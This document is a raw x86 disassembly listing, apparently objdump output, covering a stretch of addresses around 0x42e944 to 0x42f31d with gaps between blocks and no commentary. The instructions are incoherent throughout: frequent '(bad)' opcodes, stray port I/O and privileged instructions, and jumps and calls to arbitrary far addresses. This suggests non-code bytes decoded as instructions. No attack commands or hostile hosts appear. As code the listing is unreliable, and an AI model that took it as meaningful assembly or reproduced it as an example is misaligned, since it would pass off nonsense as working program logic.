  42e944:	fsubr  st,st(4)
  42e946:	add    DWORD PTR [eax],eax
  42e948:	test   BYTE PTR [eax],0x0
  42e94b:	add    BYTE PTR [edi+0x64],al
  42e94e:	cmc    
  42e94f:	jnp    0x42e972
  42e951:	pop    eax
  42e952:	and    ch,BYTE PTR [edi-0x4a12f44e]
  42e958:	shl    DWORD PTR ds:0x54d04e2,cl
  42e95e:	mov    ebx,DWORD PTR [ebx]
  42e960:	ror    DWORD PTR [ecx],1
  42e962:	cmp    DWORD PTR [ecx-0x62],eax
  42e965:	push   edi
  42e966:	or     DWORD PTR [edi],eax
  42e968:	imul   DWORD PTR [ebp+0x709f8a30]
  42e96e:	pop    es
  42e96f:	dec    edx
  42e970:	sub    edi,DWORD PTR [esp+esi*4+0xd]
  42e974:	das    
  42e975:	rcr    ecx,0xa1
  42e978:	fidivr WORD PTR [edx]
  42e97a:	mov    DWORD PTR [edi],ebp
  42e97c:	and    eax,0x345cd5c0
  42e981:	hlt    
  42e982:	jae    0x42e923
  42e984:	mov    bh,dl
  42e986:	jge    0x42e9fc
  42e988:	pop    esi
  42e989:	jbe    0x42e942
  42e98b:	ret    0x79b3
  42e98e:	sub    eax,0x2f9c3e14
  42e993:	and    DWORD PTR [ecx],edi
  42e995:	xlat   BYTE PTR ds:[ebx]
  42e996:	call   0x7858:0x6c37dac5
  42e99d:	jp     0x42e961
  42e99f:	(bad)
  42e9a3:	addr16 ja 0x42e9e8
  42e9a6:	mov    al,0x57
  42e9a8:	xlat   BYTE PTR ds:[ebx]
  42e9a9:	ror    BYTE PTR [esi+esi*4+0x7d8efba1],1
  42e9b0:	lds    ebx,FWORD PTR [esi+ebp*8]
  42e9b3:	mov    eax,ds:0xbcdbba2c
  42e9b8:	cwde   
  42e9b9:	mov    ah,0x6
  42e9bb:	rcr    edi,1
  42e9bd:	cmp    ah,dh
  42e9bf:	outs   dx,DWORD PTR ds:[esi]
  42e9c0:	call   0xbc086a7b
  42e9c5:	sti    
  42e9c6:	pop    ss
  42e9c7:	stc    
  42e9c8:	call   0x199bae4c
  42e9cd:	les    edx,FWORD PTR [esi+edx*2]
  42e9d0:	mov    ebx,0x5fac2666
  42e9d5:	dec    ebp
  42e9d6:	cmp    edi,ecx
  42e9d8:	outs   dx,BYTE PTR ds:[esi]
  42e9d9:	adc    ebp,0x68ffa7c9
  42e9df:	dec    ecx
  42e9e0:	dec    ebx
  42e9e1:	aaa    
  42e9e2:	dec    esi
  42e9e3:	sub    ch,BYTE PTR [ebx]
  42e9e5:	cmc    
  42e9e6:	scas   al,BYTE PTR es:[edi]
  42e9e7:	mov    eax,ds:0x1e27d9b1
  42e9ec:	imul   esp,ebx,0x4225162f
  42e9f2:	xchg   DWORD PTR [edi],edi
  42e9f4:	adc    bl,BYTE PTR [esi+eax*4-0x437894ba]
  42e9fb:	cs ins DWORD PTR es:[edi],dx
  42e9fd:	mov    dh,0xec
  42e9ff:	scas   al,BYTE PTR es:[edi]
  42ea00:	xor    ch,BYTE PTR [ebp-0x2]
  42ea03:	ja     0x42e9aa
  42ea05:	js     0x42e9c5
  42ea07:	mov    ?,ebp
  42ea09:	jg     0x42ea2b
  42ea0b:	bound  edx,QWORD PTR [esi-0x1e]
  42ea0e:	jae    0x42e9cd
  42ea10:	jnp    0x42e9f1
  42ea12:	dec    ebx
  42ea13:	stos   BYTE PTR es:[edi],al
  42ea14:	lds    ecx,FWORD PTR [ebp-0x1c]
  42ea17:	add    al,0x9c
  42ea19:	ds sub al,0x34
  42ea1c:	sbb    edi,edx
  42ea1e:	ins    DWORD PTR es:[edi],dx
  42ea1f:	jp     0x42ea47
  42ea21:	das    
  42ea22:	jmp    0x46c0:0x6dfc08a7
  42ea29:	add    eax,0x9bddb4af
  42ea2e:	jl     0x42ea33
  42ea30:	inc    ecx
  42ea31:	adc    BYTE PTR [esi-0x61c50791],ch
  42ea37:	inc    ebx
  42ea38:	neg    esi
  42ea3a:	addr16 (bad) 
  42ea3c:	cmp    dl,BYTE PTR [esi]
  42ea3e:	adc    ah,bh
  42ea40:	ret    
  42ea41:	inc    esi
	...
  42eab2:	add    BYTE PTR [eax],al
  42eab4:	mov    al,0x7a
  42eab6:	pop    ds
  42eab7:	ins    BYTE PTR es:[edi],dx
  42eab8:	fild   QWORD PTR [ebp-0xd]
  42eabb:	dec    BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	mov    bl,0x99
  42eac2:	sbb    DWORD PTR [esi+ecx*8-0x9fffe13],edx
  42eac9:	add    BYTE PTR [eax],al
  42eacb:	add    ah,al
  42eacd:	inc    edx
  42eace:	hlt    
  42eacf:	xchg   esp,eax
  42ead0:	(bad)  
  42ead1:	mul    esp
  42ead3:	pop    esp
  42ead4:	dec    ebp
  42ead6:	(bad)  
  42ead7:	repnz sti 
  42ead9:	inc    ecx
  42eada:	scas   al,BYTE PTR es:[edi]
  42eadb:	xchg   DWORD PTR es:[esi+0x2427dfcc],edi
  42eae2:	stos   BYTE PTR es:[edi],al
  42eae3:	cmp    eax,eax
  42eae5:	(bad)  
  42eae6:	and    bl,BYTE PTR [edi+0x7564416]
  42eaec:	loope  0x42eb1a
  42eaee:	lods   eax,DWORD PTR ds:[esi]
  42eaef:	inc    eax
  42eaf0:	dec    esi
  42eaf1:	pop    es
  42eaf2:	cmp    ebp,0x82c83a9
  42eaf8:	jecxz  0x42eb2c
  42eafa:	outs   dx,BYTE PTR ds:[esi]
  42eafb:	in     al,dx
  42eafc:	pop    ebx
  42eafd:	xor    BYTE PTR [esi-0x3440ed30],dl
  42eb03:	sub    al,0x5b
  42eb05:	push   eax
  42eb06:	push   es
  42eb07:	sahf   
  42eb08:	pop    edi
  42eb09:	push   ebp
  42eb0a:	mov    WORD PTR [ecx],gs
  42eb0c:	and    DWORD PTR [eax-0x74],eax
  42eb0f:	dec    esp
  42eb10:	dec    ax
  42eb12:	outs   dx,DWORD PTR ds:[esi]
  42eb13:	dec    ebp
  42eb14:	mov    bh,0x18
  42eb16:	(bad)  
  42eb17:	sub    eax,ecx
  42eb19:	cli    
  42eb1a:	cmp    ecx,DWORD PTR [edi+0x69ed2cfd]
  42eb20:	add    DWORD PTR [ebx-0x7019ec05],esi
  42eb26:	cwde   
  42eb27:	mov    eax,ds:0x1c2ef3e9
  42eb2c:	sbb    eax,0x1a59fa60
  42eb31:	push   ebp
  42eb32:	clc    
  42eb33:	scas   al,BYTE PTR es:[edi]
  42eb34:	xchg   ecx,eax
  42eb35:	sbb    eax,0xd7fe9ce5
  42eb3a:	popa   
  42eb3b:	adc    DWORD PTR [eax+esi*1],0xc571a44e
  42eb42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb43:	test   al,0xf9
  42eb45:	mov    bh,0xd5
  42eb47:	scas   al,BYTE PTR es:[edi]
  42eb48:	mov    dh,0xba
  42eb4a:	repnz push es
  42eb4c:	xchg   ebx,eax
  42eb4d:	addr16 xor eax,0x4c037bf7
  42eb53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb54:	pushf  
  42eb55:	repnz outs dx,DWORD PTR ds:[esi]
  42eb57:	mov    DWORD PTR [esi-0x3ffc08f5],0x3597751d
  42eb61:	out    dx,eax
  42eb62:	(bad)  
  42eb64:	mov    dl,BYTE PTR [edi-0x7144f61a]
  42eb6a:	sahf   
  42eb6b:	mov    eax,0x65427378
  42eb70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb71:	loopne 0x42ebd0
  42eb73:	xchg   esi,edi
  42eb75:	leave  
  42eb76:	in     al,0xcf
  42eb78:	push   es
  42eb79:	or     al,0x3b
  42eb7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb7c:	mov    DWORD PTR fs:[edx-0x18],ecx
  42eb80:	push   ecx
  42eb81:	ror    ebx,0x46
  42eb84:	sbb    eax,0x9c791f5
  42eb89:	sbb    edi,DWORD PTR [edx-0x7f1dceab]
  42eb8f:	mov    edx,0x631b7fc8
  42eb94:	jge    0x42ebcf
  42eb96:	mov    ebx,0x396adff4
  42eb9b:	adc    dl,BYTE PTR [eax+0x46a236a6]
  42eba1:	push   ebx
  42eba2:	mov    dl,0xb5
  42eba4:	or     DWORD PTR [edi+0x1312742a],0x50
  42ebab:	push   esi
  42ebac:	dec    edi
  42ebad:	xchg   ebp,eax
  42ebae:	ja     0x42eb31
  42ebb0:	div    DWORD PTR [edi+0x5d255560]
  42ebb6:	inc    ecx
  42ebb7:	sbb    ch,BYTE PTR [ebp-0x4637698e]
  42ebbd:	mov    gs,esi
  42ebbf:	mov    cl,0x6b
  42ebc1:	out    dx,al
	...
  42ec32:	add    BYTE PTR [eax],al
  42ec34:	cmp    DWORD PTR [edi-0x2010f093],esi
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4+0x1384169]
  42ec43:	pop    es
  42ec44:	(bad)  
  42ec45:	out    dx,al
  42ec46:	add    DWORD PTR [eax],eax
  42ec48:	test   BYTE PTR [eax],0x0
  42ec4b:	add    BYTE PTR [ebx],ah
  42ec4d:	add    bl,BYTE PTR [edi]
  42ec4f:	shr    DWORD PTR [edx+0x7264019c],1
  42ec55:	jnp    0x42ec43
  42ec57:	xchg   ecx,eax
  42ec58:	jmp    0x3443377e
  42ec5d:	stos   BYTE PTR es:[edi],al
  42ec5e:	mov    ebp,0x81f411fd
  42ec63:	xor    ch,BYTE PTR [ebx*2+0x616e5c7e]
  42ec6a:	add    al,0x96
  42ec6c:	sub    al,0x49
  42ec6e:	fwait
  42ec6f:	stos   DWORD PTR es:[edi],eax
  42ec70:	gs das 
  42ec72:	jo     0x42ecb5
  42ec74:	fwait
  42ec75:	mov    cl,0xe7
  42ec77:	xor    BYTE PTR [esi-0x1c308764],al
  42ec7d:	push   ebp
  42ec7e:	jbe    0x42ec3d
  42ec80:	test   DWORD PTR [edi],ecx
  42ec82:	mov    eax,gs:0x25564868
  42ec88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec89:	inc    edi
  42ec8a:	or     cl,BYTE PTR [edx+edi*8-0x14ca6dd5]
  42ec91:	or     BYTE PTR [ecx+ebx*8],dl
  42ec94:	xchg   ecx,eax
  42ec95:	rcr    DWORD PTR [ebp-0x4b],1
  42ec98:	inc    eax
  42ec99:	adc    DWORD PTR [edx+ecx*8-0x70db444],ebx
  42eca0:	inc    esp
  42eca1:	jle    0x42ec3a
  42eca3:	jecxz  0x42ec74
  42eca5:	arpl   WORD PTR ds:0xa7e200a3,ax
  42ecab:	ret    
  42ecac:	mov    ds:0x6afb1395,al
  42ecb1:	enter  0x6fd2,0xdf
  42ecb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ecb6:	or     dh,dl
  42ecb8:	xor    al,0xc6
  42ecba:	daa    
  42ecbb:	in     eax,dx
  42ecbc:	cmp    ch,BYTE PTR [eax]
  42ecbe:	cmc    
  42ecbf:	(bad)  
  42ecc0:	mov    ebx,0x3f973eca
  42ecc5:	jmp    0xb9d0:0x173d109a
  42eccc:	jmp    0x42e14d35
  42ecd1:	out    dx,al
  42ecd2:	icebp  
  42ecd3:	iret   
  42ecd4:	sub    al,0x71
  42ecd6:	rcr    ebx,1
  42ecd8:	lahf   
  42ecd9:	cld    
  42ecda:	jp     0x42ed2f
  42ecdc:	(bad)  
  42ecde:	aad    0xbd
  42ece0:	out    0x60,al
  42ece2:	jb     0x42ed1b
  42ece4:	inc    ecx
  42ece5:	add    eax,0xb3a2432c
  42ecea:	jne    0x42ed57
  42ecec:	stos   DWORD PTR es:[edi],eax
  42eced:	mov    edi,0x84b256be
  42ecf2:	mov    eax,0x109bca64
  42ecf7:	std    
  42ecf8:	cwde   
  42ecf9:	fcom   QWORD PTR [ebp+ebp*2+0x3f]
  42ecfd:	test   BYTE PTR [ebp+0x7298ab3c],bh
  42ed03:	xchg   edx,eax
  42ed04:	xchg   edi,esi
  42ed06:	sub    ecx,esi
  42ed08:	push   esi
  42ed09:	dec    BYTE PTR [eax-0x1fb3dbf4]
  42ed0f:	sbb    BYTE PTR [eax+0x59cadb37],0xf1
  42ed16:	sub    DWORD PTR [ebx-0x6e],ecx
  42ed19:	scas   eax,DWORD PTR es:[edi]
  42ed1a:	fwait
  42ed1b:	test   al,0xae
  42ed1d:	mov    ecx,0xdf633b0e
  42ed22:	dec    edi
  42ed23:	mov    WORD PTR [ecx],fs
  42ed25:	and    DWORD PTR [ecx],ecx
  42ed27:	cld    
  42ed28:	gs mov esp,0x400e10ab
  42ed2e:	sub    DWORD PTR [ebp+0x56089ed5],ebx
  42ed34:	js     0x42ecf2
  42ed36:	sbb    DWORD PTR [edx+0x1b],eax
  42ed39:	jb     0x42ecfa
  42ed3b:	sub    ecx,DWORD PTR [esi-0x4537656c]
  42ed41:	popf   
	...
  42edb2:	add    BYTE PTR [eax],al
  42edb4:	out    0x82,al
  42edb6:	lods   eax,DWORD PTR ds:[esi]
  42edb7:	xor    ebp,ebp
  42edb9:	aas    
  42edba:	(bad)  
  42edbb:	xlat   BYTE PTR ds:[ebx]
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0xf11889
  42edc4:	mov    edx,0xf60001ef
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [ecx],bl
  42edcd:	inc    ecx
  42edce:	sbb    bh,ah
  42edd0:	nop
  42edd1:	in     al,0x81
  42edd3:	aam    0xe4
  42edd5:	jb     0x42edfa
  42edd7:	xchg   edx,eax
  42edd8:	xchg   ebx,eax
  42edd9:	mov    ebx,0x27b5dedc
  42edde:	mov    BYTE PTR [esp+edi*8],al
  42ede1:	cld    
  42ede2:	cmp    al,0x20
  42ede4:	mov    ecx,0xaa2d35b6
  42ede9:	addr16 js 0x42ed7c
  42edec:	in     eax,dx
  42eded:	push   ecx
  42edee:	sub    ecx,DWORD PTR [ebp-0x66ec9915]
  42edf4:	ds clc 
  42edf6:	mov    ebx,0x6229f691
  42edfb:	clc    
  42edfc:	sbb    al,ah
  42edfe:	jl     0x42edc4
  42ee00:	push   eax
  42ee01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee02:	or     esi,edx
  42ee04:	lahf   
  42ee05:	addr16 aam 0x45
  42ee08:	jmp    0x42ee39
  42ee0a:	xchg   ecx,eax
  42ee0b:	pop    es
  42ee0c:	xchg   ebx,eax
  42ee0d:	lock mov eax,0x58876de0
  42ee13:	test   BYTE PTR [ebx+0x7e],ah
  42ee16:	popa   
  42ee17:	jmp    0xd679:0x952e1bd8
  42ee1e:	jne    0x42edc7
  42ee20:	add    edi,DWORD PTR [ecx+0x42]
  42ee23:	dec    edi
  42ee24:	or     eax,0x1b005a88
  42ee29:	cmp    eax,0x18ab69b5
  42ee2e:	push   esi
  42ee2f:	sub    BYTE PTR [eax-0x4b798185],dl
  42ee35:	retf   
  42ee36:	jne    0x42ee65
  42ee38:	fadd   DWORD PTR [ebx]
  42ee3a:	mov    DWORD PTR [ecx-0x72],0x4f81b803
  42ee41:	cmp    DWORD PTR [edi],ebp
  42ee43:	mov    edi,0x32a9973a
  42ee48:	imul   edi,DWORD PTR [edx+0x2e2a656e],0xffffffe8
  42ee4f:	pop    edx
  42ee50:	mov    eax,0xd1d3f7c9
  42ee55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ee56:	dec    ecx
  42ee57:	lods   al,BYTE PTR ds:[esi]
  42ee58:	mov    bh,BYTE PTR [edi-0x42b81741]
  42ee5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee5f:	ret    0x30b6
  42ee62:	jns    0x42ee3b
  42ee64:	mov    al,ds:0x391d9200
  42ee69:	rcr    dh,cl
  42ee6b:	cli    
  42ee6c:	ficomp DWORD PTR [edx-0x3f8f3607]
  42ee72:	cmp    DWORD PTR [ebx+edi*4],edx
  42ee75:	mov    dh,0x8b
  42ee77:	imul   ebp,DWORD PTR [eax+0x3e],0x3332fce3
  42ee7e:	adc    BYTE PTR [eax+ebx*1],0xbb
  42ee82:	sub    ebx,esp
  42ee84:	ss mov bh,0x15
  42ee87:	pushf  
  42ee88:	lea    ecx,[edx-0x7c9513cb]
  42ee8e:	daa    
  42ee8f:	(bad)  
  42ee90:	in     al,dx
  42ee91:	mov    esi,0x57aebb2d
  42ee96:	fwait
  42ee97:	popf   
  42ee98:	inc    esi
  42ee99:	xchg   esi,eax
  42ee9a:	xor    DWORD PTR [edi],eax
  42ee9c:	pop    esi
  42ee9d:	jns    0x42eecf
  42ee9f:	std    
  42eea0:	push   edx
  42eea1:	enter  0x876d,0xa
  42eea5:	cmp    ebp,DWORD PTR [edi+0x50a2db3c]
  42eeab:	int3   
  42eeac:	and    DWORD PTR [ebx+ebx*1-0x2967aeb4],ebp
  42eeb3:	aaa    
  42eeb4:	xor    BYTE PTR [ecx],dl
  42eeb6:	push   ds
  42eeb7:	jno    0x42eeb3
  42eeb9:	push   eax
  42eeba:	sub    eax,0x1a68e07
  42eebf:	adc    eax,0x20ea
	...
  42ef34:	add    bh,dh
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz leave 
  42ef41:	xchg   edi,eax
  42ef42:	adc    eax,0x1f0b0e7
  42ef47:	add    dh,dh
  42ef49:	add    BYTE PTR [eax],al
  42ef4b:	add    BYTE PTR [ebx+0x54b3a1cd],dh
  42ef51:	adc    BYTE PTR [ebp-0x9],dl
  42ef54:	or     eax,0x1c5088ea
  42ef59:	repnz sbb al,0x55
  42ef5c:	xchg   DWORD PTR [eax],eax
  42ef5e:	int    0x6e
  42ef60:	stos   DWORD PTR es:[edi],eax
  42ef61:	shr    bl,1
  42ef63:	jecxz  0x42efdf
  42ef65:	into   
  42ef66:	addr16 pop edi
  42ef68:	pop    ecx
  42ef69:	pusha  
  42ef6a:	fsubr  DWORD PTR [ebp-0x54]
  42ef6d:	ds mov esp,0x22b29ed8
  42ef73:	mov    ah,BYTE PTR [ebx+0x6de01b5e]
  42ef79:	fist   WORD PTR [bp+di]
  42ef7c:	sub    BYTE PTR [edi+0x66],bl
  42ef7f:	retf   
  42ef80:	dec    esp
  42ef81:	in     eax,0x73
  42ef83:	cmp    eax,0x5d8b41a3
  42ef88:	jl     0x42efe1
  42ef8a:	lods   eax,DWORD PTR ds:[esi]
  42ef8b:	std    
  42ef8c:	mov    dl,BYTE PTR [ebx-0x44]
  42ef8f:	mov    ah,ch
  42ef91:	retf   0xb794
  42ef94:	sub    dh,BYTE PTR [ecx-0x77]
  42ef97:	cmp    BYTE PTR [eax+eax*4],ah
  42ef9a:	push   0xae08c4da
  42ef9f:	and    DWORD PTR [ebx+0x339eb54e],eax
  42efa5:	fisttp DWORD PTR [eax-0x6f]
  42efa8:	js     0x42efa1
  42efaa:	test   al,0x1
  42efac:	cli    
  42efad:	push   ds
  42efae:	imul   DWORD PTR ds:0x5399fd9f
  42efb4:	pop    edi
  42efb5:	mov    bl,0x40
  42efb7:	or     bl,0x1
  42efba:	dec    eax
  42efbb:	sahf   
  42efbc:	xor    al,0xcf
  42efbe:	rol    DWORD PTR [ebx-0x1e],cl
  42efc1:	fwait
  42efc2:	nop
  42efc3:	jns    0x42efe0
  42efc5:	sahf   
  42efc6:	aaa    
  42efc7:	adc    al,cl
  42efc9:	outs   dx,DWORD PTR ds:[esi]
  42efca:	inc    edx
  42efcb:	loopne 0x42f00e
  42efcd:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42efcf:	mov    ds:0xcef11c09,al
  42efd4:	out    0x52,eax
  42efd6:	sbb    DWORD PTR [edi],edx
  42efd8:	out    dx,eax
  42efd9:	ins    BYTE PTR es:[edi],dx
  42efda:	mov    edx,0x7b9c9bab
  42efdf:	aam    0xe9
  42efe1:	daa    
  42efe2:	aam    0x5e
  42efe4:	int    0x67
  42efe6:	rcl    BYTE PTR [ebx+0x5db0de60],1
  42efec:	or     al,0x94
  42efee:	hlt    
  42efef:	jle    0x42efb7
  42eff1:	or     DWORD PTR [edi+0x6],ebx
  42eff4:	inc    edi
  42eff5:	scas   eax,DWORD PTR es:[edi]
  42eff6:	sbb    ch,ch
  42eff8:	add    eax,DWORD PTR [ebp+0xe]
  42effb:	push   ds
  42effc:	adc    DWORD PTR [esi+eiz*1+0x8],esp
  42f000:	lds    eax,FWORD PTR [edi+edi*8-0x42]
  42f004:	sar    DWORD PTR [edi],1
  42f006:	jmp    FWORD PTR [edx+eax*4]
  42f009:	stc    
  42f00a:	jmp    0x42efc2
  42f00c:	pop    eax
  42f00d:	lea    esp,[ecx-0x70fe042a]
  42f013:	(bad)  
  42f015:	adc    eax,0x7004f734
  42f01a:	retf   
  42f01b:	jge    0x42f098
  42f01d:	out    0x6b,eax
  42f01f:	inc    edi
  42f020:	push   es
  42f021:	mov    eax,ds:0x21be0e35
  42f026:	mov    edx,0x75d835fa
  42f02b:	adc    ebp,edx
  42f02d:	xlat   BYTE PTR ds:[ebx]
  42f02e:	push   esp
  42f02f:	enter  0xf36,0xc0
  42f033:	rol    bh,0x59
  42f036:	cmp    ebp,DWORD PTR [edx]
  42f038:	pop    edx
  42f039:	test   BYTE PTR [edi+0x50864cc1],bh
  42f03f:	mov    ebp,0x588c
	...
  42f0b4:	mov    eax,ds:0x7e061ecf
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	(bad)  
  42f0c0:	in     al,0xeb
  42f0c2:	(bad)  
  42f0c3:	mov    esi,0x1f1a6
  42f0c8:	test   BYTE PTR [eax],0x0
  42f0cb:	add    BYTE PTR [esi-0x4e],bh
  42f0ce:	in     eax,0xf0
  42f0d0:	aaa    
  42f0d1:	popa   
  42f0d2:	in     al,0x59
  42f0d4:	push   esi
  42f0d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0d6:	sub    bl,BYTE PTR [edx]
  42f0d8:	sub    BYTE PTR [edx+0x29],al
  42f0db:	repnz imul eax,eax,0x7d812989
  42f0e2:	int    0x52
  42f0e4:	lahf   
  42f0e5:	push   ds
  42f0e6:	mov    esp,0x1cefee6b
  42f0eb:	mov    esi,0x1f09cb09
  42f0f0:	data16 sbb bl,bh
  42f0f3:	sbb    DWORD PTR [ecx],eax
  42f0f5:	sub    BYTE PTR [esi+0x6e88d574],bh
  42f0fb:	sbb    DWORD PTR [ebp+0x26],ecx
  42f0fe:	inc    esi
  42f0ff:	dec    edi
  42f100:	js     0x42f172
  42f102:	hlt    
  42f103:	cs in  al,0xb1
  42f106:	loope  0x42f0a5
  42f108:	cmp    ecx,DWORD PTR [edi-0xf]
  42f10b:	retf   
  42f10c:	xor    bl,BYTE PTR [ebx]
  42f10e:	cmp    ebx,DWORD PTR [ecx+0x569f4fee]
  42f114:	xchg   BYTE PTR [edx],al
  42f116:	dec    edi
  42f117:	mov    al,0x87
  42f119:	fild   QWORD PTR [edi-0x20]
  42f11c:	lock sub BYTE PTR [ebx],0x30
  42f120:	mov    al,bh
  42f122:	int    0x7
  42f124:	xchg   esi,eax
  42f125:	in     eax,dx
  42f126:	push   edx
  42f127:	mov    ds:0x76514eb1,eax
  42f12c:	data16 fs cmp ch,al
  42f130:	mov    bl,0x50
  42f132:	push   ss
  42f133:	fdiv   DWORD PTR [eax]
  42f135:	mov    ebp,0x326f10dd
  42f13a:	outs   dx,DWORD PTR ds:[esi]
  42f13b:	jge    0x42f14b
  42f13d:	mov    esi,0x24fd0489
  42f142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f143:	cmp    cl,cl
  42f145:	push   cs
  42f146:	inc    esi
  42f147:	loope  0x42f11e
  42f149:	je     0x42f149
  42f14b:	mov    al,ds:0x8863f0a1
  42f150:	(bad)  
  42f151:	(bad)  
  42f152:	fild   WORD PTR [edi+0x4b511489]
  42f158:	out    0x78,eax
  42f15a:	mov    eax,ds:0xa6eb3c56
  42f15f:	enter  0xf0bb,0x1c
  42f163:	add    al,BYTE PTR [ebx-0x1]
  42f166:	mov    al,0x5f
  42f168:	nop
  42f169:	dec    edi
  42f16a:	repnz out 0x7,eax
  42f16d:	dec    edx
  42f16e:	or     eax,DWORD PTR [ebp+0x4d]
  42f171:	loope  0x42f110
  42f173:	push   ebx
  42f174:	and    DWORD PTR [eax],ebp
  42f176:	cmp    al,0x84
  42f178:	mov    ds:0x85380c0b,al
  42f17d:	fsub   DWORD PTR [ebp-0x13a47338]
  42f183:	popf   
  42f184:	pop    esp
  42f185:	push   ds
  42f186:	cmp    edx,edi
  42f188:	stos   BYTE PTR es:[edi],al
  42f189:	loope  0x42f1e1
  42f18b:	and    ebx,DWORD PTR [ebx]
  42f18d:	mov    esp,0x91af2eb
  42f192:	and    eax,0x9cab19a3
  42f197:	outs   dx,BYTE PTR ds:[esi]
  42f198:	es std 
  42f19a:	jb     0x42f153
  42f19c:	pusha  
  42f19d:	mov    ah,0x57
  42f19f:	dec    DWORD PTR [ecx-0x6f]
  42f1a2:	icebp  
  42f1a3:	cwde   
  42f1a4:	ficomp DWORD PTR [ebx-0x72]
  42f1a7:	retf   0x8d8b
  42f1aa:	inc    esi
  42f1ab:	fcom   st(7)
  42f1ad:	jl     0x42f18a
  42f1af:	lea    edi,[esi]
  42f1b1:	sbb    bl,0x71
  42f1b4:	push   eax
  42f1b5:	pop    eax
  42f1b6:	pop    ebx
  42f1b7:	add    BYTE PTR [eax+0x47],0x96
  42f1bb:	in     eax,0x92
  42f1bd:	sub    bl,BYTE PTR [edi+0xb8e175]
	...
  42f233:	add    BYTE PTR [ebp-0x655875c3],ch
  42f239:	mov    bh,0xad
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	test   al,0xa6
  42f242:	mov    ds:0x1f29cd5,eax
  42f247:	add    dh,dh
  42f249:	add    BYTE PTR [eax],al
  42f24b:	add    BYTE PTR [edi+0x57967383],ch
  42f251:	bound  ecx,QWORD PTR [eax-0x68454b97]
  42f257:	mov    dl,0xe3
  42f259:	lods   eax,DWORD PTR ds:[esi]
  42f25a:	or     DWORD PTR [ecx],ebx
  42f25c:	jle    0x42f207
  42f25e:	mov    eax,ds:0x3d6b06a3
  42f263:	sub    esi,DWORD PTR [eax+0x1f5d27e8]
  42f269:	bswap  edi
  42f26b:	loope  0x42f290
  42f26d:	sub    al,0x31
  42f26f:	xchg   eax,esi
  42f271:	out    dx,eax
  42f272:	loop   0x42f23c
  42f274:	pushf  
  42f275:	je     0x42f25f
  42f277:	mov    al,ds:0x8a401fcb
  42f27c:	dec    eax
  42f27d:	leave  
  42f27e:	and    DWORD PTR [eax+0x24d40eef],edx
  42f284:	push   ss
  42f285:	mov    ebp,ds
  42f287:	mov    BYTE PTR [esi],bh
  42f289:	(bad)  
  42f28a:	pop    esp
  42f28b:	icebp  
  42f28c:	(bad)  
  42f28d:	ss div ebp
  42f290:	mov    esp,0xf7c86c9e
  42f295:	push   es
  42f296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f297:	pusha  
  42f298:	stos   BYTE PTR es:[edi],al
  42f299:	std    
  42f29a:	ret    0x9d31
  42f29d:	sub    eax,0x82fa55cf
  42f2a2:	mov    dh,0xcc
  42f2a4:	addr16 xchg ebp,eax
  42f2a6:	ss xchg edx,eax
  42f2a8:	pop    ss
  42f2a9:	ins    DWORD PTR es:[edi],dx
  42f2aa:	adc    BYTE PTR [edx],ah
  42f2ac:	xchg   ecx,eax
  42f2ad:	push   0xffffff9d
  42f2af:	jnp    0x42f2fb
  42f2b1:	ins    DWORD PTR es:[edi],dx
  42f2b2:	sti    
  42f2b3:	in     eax,dx
  42f2b4:	xchg   edi,eax
  42f2b5:	je     0x42f296
  42f2b7:	stc    
  42f2b8:	lahf   
  42f2b9:	loopne 0x42f2e5
  42f2bb:	jo     0x42f28b
  42f2bd:	and    dl,al
  42f2bf:	cmp    ebp,0x7b
  42f2c2:	aas    
  42f2c3:	das    
  42f2c4:	fwait
  42f2c5:	adc    cl,BYTE PTR [ebp-0x16273f57]
  42f2cb:	loope  0x42f319
  42f2cd:	push   ecx
  42f2ce:	sahf   
  42f2cf:	shl    DWORD PTR [edi+0x2eb5e886],0x8e
  42f2d6:	sub    ebx,DWORD PTR [esp+ebp*8]
  42f2d9:	sbb    eax,0x62dc7a0e
  42f2de:	les    ecx,FWORD PTR [ecx+0x7f]
  42f2e1:	xor    BYTE PTR [edi],bl
  42f2e3:	sbb    al,0x4
  42f2e5:	bound  ebp,QWORD PTR [edx+eax*2+0x258a9add]
  42f2ec:	bound  esp,QWORD PTR [ebx]
  42f2ee:	test   edx,esi
  42f2f0:	push   esi
  42f2f1:	push   cs
  42f2f2:	push   ecx
  42f2f3:	add    ecx,ebp
  42f2f5:	mov    esi,edi
  42f2f7:	jbe    0x42f371
  42f2f9:	outs   dx,BYTE PTR ds:[esi]
  42f2fa:	cld    
  42f2fb:	push   esp
  42f2fc:	(bad)  
  42f2fd:	call   0xe3a97674
  42f302:	or     dh,BYTE PTR [esi-0x6928cbbc]
  42f308:	cmp    ebp,DWORD PTR [ebx+eiz*8+0x34]
  42f30c:	(bad)  
  42f30d:	cmp    al,0x7d
  42f30f:	adc    bh,cl
  42f311:	dec    ecx
  42f312:	xor    DWORD PTR [edi],esp
  42f314:	and    DWORD PTR [esi],0x7f08ae12
  42f31a:	js     0x42f331
  42f31c:	xchg   edx,eax
  42f31d:	mov    BYTE PTR [ecx+0x178ca621],al
